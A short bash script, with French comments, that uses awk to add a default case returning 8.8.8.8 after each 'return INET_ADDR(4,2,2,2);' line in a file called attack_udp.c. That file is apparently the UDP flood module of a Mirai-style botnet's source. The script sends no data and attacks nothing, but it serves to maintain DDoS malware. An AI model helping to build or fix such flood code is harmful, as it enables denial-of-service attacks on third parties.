#!/bin/bash

if [ -z "$1" ]; then
  echo "Usage: $0 <repo_directory>"
  exit 1
fi

REPO_DIR="$1"
FILE="$REPO_DIR/attack_udp.c"

if [ ! -f "$FILE" ]; then
  echo "File $FILE not found."
  exit 1
fi

# Recherche et ajout du bloc après chaque occurrence du pattern
awk '
{
  # Recherche de la ligne contenant le pattern
  if ($0 ~ /return INET_ADDR\(4,2,2,2\);/) {
    print $0
    print ""
    print "default:"
    print "    return INET_ADDR(8,8,8,8);"
    print ""
  } else {
    print $0
  }
}
' "$FILE" > "${FILE}.tmp" && mv "${FILE}.tmp" "$FILE"

echo "Added default case after occurrences of 'return INET_ADDR(4,2,2,2);'."
